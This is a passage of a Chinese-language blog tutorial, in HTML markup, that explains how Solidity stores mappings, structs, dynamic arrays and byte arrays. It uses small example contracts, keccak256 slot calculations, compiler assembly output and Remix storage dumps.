operator">>></span><span class="token operator">></span> keccak256<span class="token punctuation">(</span>bytes32<span class="token punctuation">(</span>0xC0FEFE<span class="token punctuation">)</span> + bytes32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">))</span><span class="token string">'79826054ee948a209ff4a6c9064d7398508d2c1909a392f899d301c6d232187c'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>计算键存储地址的公式为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">keccak256<span class="token punctuation">(</span>bytes32<span class="token punctuation">(</span>key<span class="token punctuation">)</span> + bytes32<span class="token punctuation">(</span>position<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h2 id="Two-Mappings"><a href="#Two-Mappings" class="headerlink" title="Two Mappings"></a>Two Mappings</h2><p>让我们采用我们计算值存储位置的公式！假设我们有一个包含两个映射的合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-mapping-2.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> itemsA<span class="token punctuation">;</span><span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> itemsB<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>itemsA<span class="token punctuation">[</span><span class="token number">0xAAAA</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xAAAA</span><span class="token punctuation">;</span>itemsB<span class="token punctuation">[</span><span class="token number">0xBBBB</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBBBB</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><ul><li><code>itemsA</code> 的位置是 <code>0</code>，对于键 <code>0xAAAA</code>：</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># key = 0xAAAA, position = 0</span><span class="token operator">>></span><span class="token operator">></span> keccak256<span class="token punctuation">(</span>bytes32<span class="token punctuation">(</span>0xAAAA<span class="token punctuation">)</span> + bytes32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">))</span><span class="token string">'839613f731613c3a2f728362760f939c8004b5d9066154aab51d6dadf74733f3'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><ul><li><code>itemsB</code> 的位置是<code>1</code>，对于键 <code>0xBBBB</code>：</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># key = 0xBBBB, position = 1</span><span class="token operator">>></span><span class="token operator">></span> keccak256<span class="token punctuation">(</span>bytes32<span class="token punctuation">(</span>0xBBBB<span class="token punctuation">)</span> + bytes32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">))</span><span class="token string">'34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>让我们用编译器验证这些计算：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm --optimize  c-mapping-2.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  // <span class="token punctuation">..</span>. Omit memory operations that could be optimized away  0xaaaa  0x839613f731613c3a2f728362760f939c8004b5d9066154aab51d6dadf74733f3  sstore  0xbbbb  0x34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>正如预期的那样。</p><h2 id="KECCAK256-in-Assembly"><a href="#KECCAK256-in-Assembly" class="headerlink" title="KECCAK256 in Assembly"></a>KECCAK256 in Assembly</h2><p>编译器能够预先计算键的地址，因为所涉及的值是常量。如果使用的键是变量，则需要使用汇编代码进行散列。现在我们要禁用这种优化，这样我们就可以看到在汇编中散列是如何完成的。</p><p>事实证明，通过引入一个带有虚拟变量 <code>i</code> 的额外间接访问，很容易削弱优化器：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-mapping--no-constant-folding.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> items<span class="token punctuation">;</span><span class="token comment">// This variable causes constant folding to fail.</span><span class="token builtin">uint256</span> i <span class="token operator">=</span> <span class="token number">0xC0FEFE</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>items<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x42</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>变量 <code>items</code> 的位置仍然是 <code>0x0</code>，所以我们应该期待与之前相同的地址。</p><p>使用编译优化，但这次没有哈希预计算：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm --optimize  c-mapping--no-constant-folding.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>注释的汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  // Load <span class="token variable"><span class="token variable">`</span>i<span class="token variable">`</span></span> onto the stack  sload<span class="token punctuation">(</span>0x1<span class="token punctuation">)</span>    <span class="token punctuation">[</span>0xC0FEFE<span class="token punctuation">]</span>  // Store the key <span class="token variable"><span class="token variable">`</span>0xC0FEFE<span class="token variable">`</span></span> <span class="token keyword">in</span> memory at 0x0, <span class="token keyword">for</span> hashing.  0x0    <span class="token punctuation">[</span>0x0 0xC0FEFE<span class="token punctuation">]</span>  swap1    <span class="token punctuation">[</span>0xC0FEFE 0x0<span class="token punctuation">]</span>  dup2    <span class="token punctuation">[</span>0x0 0xC0FEFE 0x0<span class="token punctuation">]</span>  mstore    <span class="token punctuation">[</span>0x0<span class="token punctuation">]</span>    memory: <span class="token punctuation">&#123;</span>      0x00 <span class="token operator">=</span><span class="token operator">></span> 0xC0FEFE    <span class="token punctuation">&#125;</span>  // Store the position <span class="token variable"><span class="token variable">`</span>0x0<span class="token variable">`</span></span> <span class="token keyword">in</span> memory at 0x20 <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>, <span class="token keyword">for</span> hashing.  0x20 // <span class="token number">32</span>    <span class="token punctuation">[</span>0x20 0x0<span class="token punctuation">]</span>  dup2    <span class="token punctuation">[</span>0x0 0x20 0x0<span class="token punctuation">]</span>  swap1    <span class="token punctuation">[</span>0x20 0x0 0x0<span class="token punctuation">]</span>  mstore    <span class="token punctuation">[</span>0x0<span class="token punctuation">]</span>    memory: <span class="token punctuation">&#123;</span>      0x00 <span class="token operator">=</span><span class="token operator">></span> 0xC0FEFE      0x20 <span class="token operator">=</span><span class="token operator">></span> 0x0    <span class="token punctuation">&#125;</span>  // Starting at 0th byte, <span class="token builtin class-name">hash</span> the next 0x40 <span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> bytes <span class="token keyword">in</span> memory  0x40 // <span class="token number">64</span>    <span class="token punctuation">[</span>0x40 0x0<span class="token punctuation">]</span>  swap1    <span class="token punctuation">[</span>0x0 0x40<span class="token punctuation">]</span>  keccak256    <span class="token punctuation">[</span>0x798<span class="token punctuation">..</span>.187c<span class="token punctuation">]</span>  // Store 0x42 at the calculated address  0x42    <span class="token punctuation">[</span>0x42 0x798<span class="token punctuation">..</span>.187c<span class="token punctuation">]</span>  swap1    <span class="token punctuation">[</span>0x798<span class="token punctuation">..</span>.187c 0x42<span class="token punctuation">]</span>  sstore    store: <span class="token punctuation">&#123;</span>      0x798<span class="token punctuation">..</span>.187c <span class="token operator">=</span><span class="token operator">></span> 0x42    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>mstore</code> 指令在内存中写入 32 个字节。内存要便宜得多，读写只需 3 个 gas。汇编的前半部分通过将键和位置加载到相邻的内存块中来“连接”键和位置：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> <span class="token number">0</span>                   <span class="token number">31</span>  <span class="token number">32</span>                 <span class="token number">63</span><span class="token punctuation">[</span>    key <span class="token punctuation">(</span><span class="token number">32</span> bytes<span class="token punctuation">)</span>    <span class="token punctuation">]</span><span class="token punctuation">[</span> position <span class="token punctuation">(</span><span class="token number">32</span> bytes<span class="token punctuation">)</span> <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>然后 <code>keccak256</code> 指令对该内存区域中的数据进行哈希处理。费用取决于哈希的数据量：</p><ul><li>每个 SHA3 操作需要支付 30</li><li>每个 32 字节的字(word)需要支付 6</li></ul><p>对于一个 <code>uint256</code> 的键，gas 成本为 42 (<code>30 + 6 * 2)</code>)。</p><h2 id="Mapping-Large-Values"><a href="#Mapping-Large-Values" class="headerlink" title="Mapping Large Values"></a>Mapping Large Values</h2><p>每个存储槽只能存储 32 个字节。如果我们尝试存储一个更大的结构会发生什么？</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=></span> Tuple<span class="token punctuation">)</span> tuples<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Tuple</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token builtin">uint256</span> b<span class="token punctuation">;</span><span class="token builtin">uint256</span> c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tuples<span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">0x1A</span><span class="token punctuation">;</span>tuples<span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">0x1B</span><span class="token punctuation">;</span>tuples<span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">0x1C</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>编译，你应该会看到 3 个 <code>sstore</code> 指令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  // <span class="token punctuation">..</span>.omitting unoptimized code  0x1a  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7d  sstore  0x1b  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7e  sstore  0x1c  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7f  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，除了最后一位之外，计算出的地址是相同的。 <code>Tuple</code> 结构体的成员字段依次排列（..7d、..7e、..7f）。</p><h2 id="Mappings-Don’t-Pack"><a href="#Mappings-Don’t-Pack" class="headerlink" title="Mappings Don’t Pack"></a>Mappings Don’t Pack</h2><p>考虑到映射的设计方式，您为每项支付的最小存储量是 32 字节，即使您只存储 1 个字节：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=></span> <span class="token builtin">uint8</span><span class="token punctuation">)</span> items<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>items<span class="token punctuation">[</span><span class="token number">0xA</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xAA</span><span class="token punctuation">;</span>items<span class="token punctuation">[</span><span class="token number">0xB</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBB</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>如果一个值大于 32 字节，则您以 32 字节为增量支付存储费用。</p><h2 id="Dynamic-Arrays-Are-Mapping"><a href="#Dynamic-Arrays-Are-Mapping" class="headerlink" title="Dynamic Arrays Are Mapping++"></a>Dynamic Arrays Are Mapping++</h2><p>在典型的语言中，数组只是一起存放在内存中的项列表。假设您有一个包含 100 个 <code>uint8</code> 元素的数组，那么它将占用 100 个字节的内存。在这种机制下，将整个数组批量加载到 CPU 缓存中并循环访问这些项目是很便宜的。</p><p>对于大多数语言，数组比映射便宜。然而，对于 Solidity，数组是更昂贵版本的映射。数组的项将在存储中按顺序排列，例如：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x290d<span class="token punctuation">..</span>.e5630x290d<span class="token punctuation">..</span>.e5640x290d<span class="token punctuation">..</span>.e5650x290d<span class="token punctuation">..</span>.e566<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>但请记住，对这些存储槽的每次访问实际上都是在数据库中进行键值查找。访问一个数组元素与访问映射元素没有什么不同。</p><p>考虑 <code>[]uint256</code> 类型，它本质上与 <code>mapping(uint256 =&gt; uint256)</code> 相同，并添加了使其“类似数组”的特性：</p><ul><li><code>length</code> 表示有多少个项；</li><li>边界检查。读取和写入大于长度的索引时抛出错误(error)；</li><li>比映射更复杂的存储打包行为；</li><li>缩小数组时自动清零未使用的存储槽；</li><li>对 <code>bytes</code> 和 <code>string</code> 进行特殊优化，使短数组（小于 31 字节）的存储效率更高。</li></ul><h2 id="Simple-Array"><a href="#Simple-Array" class="headerlink" title="Simple Array"></a>Simple Array</h2><p>让我们看一个存储三个项的数组：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-darray.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chunks<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>chunks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xAA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>chunks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xBB</span><span class="token punctuation">)</span><span class="token punctuation">;</span>chunks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xCC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>数组访问的汇编代码太复杂而无法追踪。让我们使用 Remix 调试器来运行合约。</p><p>在模拟结束时，我们可以看到使用了 4 个存储槽。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">key: 0x0000000000000000000000000000000000000000000000000000000000000000value: 0x0000000000000000000000000000000000000000000000000000000000000003key: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563value: 0x00000000000000000000000000000000000000000000000000000000000000aakey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564value: 0x00000000000000000000000000000000000000000000000000000000000000bbkey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e565value: 0x00000000000000000000000000000000000000000000000000000000000000cc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>chunks</code> 变量的位置为 <code>0x0</code>，用于存储数组的长度（<code>0x3</code>）。哈希变量的位置以找到存储数组数据的地址：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># position = 0</span><span class="token operator">>></span><span class="token operator">></span> keccak256<span class="token punctuation">(</span>bytes32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">))</span><span class="token string">'290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>数组中的每一项都是从这个地址（<code>0x29..63</code>、<code>0x29..64</code>、<code>0x29..65</code>）开始按顺序排列的。</p><h2 id="Dynamic-Array-Packing"><a href="#Dynamic-Array-Packing" class="headerlink" title="Dynamic Array Packing"></a>Dynamic Array Packing</h2><p>所有重要的打包行为是怎么样的？数组优于映射的一个优点是打包是可以使用的。<code>uint128[]</code> 数组的四个项目正好适合两个存储槽（加上 1 用于存储长度）。</p><p>考虑：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint128</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xAA</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBB</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCC</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xDD</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在 Remix 中运行这个，最后的存储是这样的：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">key: 0x0000000000000000000000000000000000000000000000000000000000000000value: 0x0000000000000000000000000000000000000000000000000000000000000004key: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563value: 0x000000000000000000000000000000bb000000000000000000000000000000aakey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564value: 0x000000000000000000000000000000dd000000000000000000000000000000cc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>正如预期的那样，只使用了 3 个存储槽。长度再次存储在 <code>0x0</code>，即存储变量的位置。四个项打包在两个独立的存储槽中。这个数组的起始地址是变量位置的哈希值：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># position = 0</span><span class="token operator">>></span><span class="token operator">></span> keccak256<span class="token punctuation">(</span>bytes32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">))</span><span class="token string">'290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>现在，地址每两个数组元素递增一次。看起来不错！</p><p>但是汇编代码本身并没有得到很好的优化。由于只使用了两个存储槽，我们希望优化器使用两个 <code>sstore</code> 进行赋值(assignment)。不幸的是，由于引入了边界检查（和其他一些东西），因此无法优化 <code>sstore</code> 指令。</p><p>四个 <code>sstore</code> 指令用于赋值(assignment)：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/* <span class="token string">"c-bytes--sstore-optimize-fail.sol"</span>:105:116  s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> 0xAA */sstore/* <span class="token string">"c-bytes--sstore-optimize-fail.sol"</span>:126:137  s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> 0xBB */sstore/* <span class="token string">"c-bytes--sstore-optimize-fail.sol"</span>:147:158  s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> 0xCC */sstore/* <span class="token string">"c-bytes--sstore-optimize-fail.sol"</span>:168:179  s<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> 0xDD */sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Byte-Arrays-amp-String"><a href="#Byte-Arrays-amp-String" class="headerlink" title="Byte Arrays &amp; String"></a>Byte Arrays &amp; String</h2><p><code>bytes</code> 和 <code>string</code> 是分别针对字节(bytes)和字符(characters)进行优化的特殊数组类型。如果数组的长度小于 31 字节，则只使用一个存储槽来存储整个事物。较长字节数组的表示方式与普通数组大致相同。</p><p>让我们看看一个短字节数组的作用：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-bytes--long.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">bytes</span> s<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xAA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xBB</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xCC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>由于数组只有 3 个字节（小于 31 个字节），它只占用一个存储槽。在 Remix 中运行，存储如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">key: 0x0000000000000000000000000000000000000000000000000000000000000000value: 0xaabbcc0000000000000000000000000000000000000000000000000000000006<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>数据 <code>0xaabbcc...</code> 从左到右存储。后面的 <code>0</code> 是空数据。最后一个字节 <code>0x06</code> 是数组的编码长度。公式为 <code>encodedLength / 2 = length</code>。在这种情况下，实际长度为 <code>6 / 2 = 3</code>。</p><p>字符串的工作方式完全相同。</p><h2 id="A-Long-Byte-Array"><a href="#A-Long-Byte-Array" class="headerlink" title="A Long Byte Array"></a>A Long Byte Array</h2><p>如果数据量大于 31 字节，则字节数组类似于 <code>[]byte</code>。让我们看一下 128 字节长的字节数组：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-bytes--long.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">bytes</span> s<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">32</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">63</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">127</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在 Remix 中运行，我们看到存储中使用了四个插槽：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x0000<span class="token punctuation">..</span>.00000x0000<span class="token punctuation">..</span>.01010x290d<span class="token punctuation">..</span>.e5630x0000<span class="token punctuation">..</span>.00010x290d<span class="token punctuation">..</span>.e5640x0000<span class="token punctuation">..</span>.00020x290d<span class="token punctuation">..</span>.e5650x0000<span class="token punctuation">..</span>.00030x290d<span class="token punctuation">..</span>.e5660x0000<span class="token punctuation">..</span>.0004<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>存储槽 <code>0x0</code> 不再用于存储数据。整个槽现在存储编码的数组长度。要获得实际长度，请执行 <code>length = (encodedLength - 1) / 2</code>。在这种情况下，长度为 <code>128 = (0x101 - 1) / 2</code>。实际字节存储在 <code>0x290d...e563</code> 中，并且依次存储在后面的插槽中。</p><p>字节数组的汇编代码很大。除了正常的边界检查和数组大小调整之外，它还需要对长度进行编码&#x2F;解码，并注意在长字节数组和短字节数组之间进行转换。</p><blockquote><p>为什么要将长度编码？因为它的完成方式，有一个简单的方法来测试一个字节数组是短的还是长的。请注意，长数组的编码长度总是奇数，短数组则是偶数。汇编代码只需要查看最后一位，看看它是零（偶数&#x2F;短）还是非零（奇数&#x2F;长）。</p></blockquote><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" 